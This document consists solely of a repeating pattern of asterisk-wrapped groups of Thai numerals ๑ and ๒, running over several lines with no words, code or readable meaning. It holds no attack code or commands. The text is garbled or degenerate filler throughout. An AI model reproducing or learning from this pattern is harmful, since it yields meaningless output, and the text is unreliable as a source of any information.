*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* 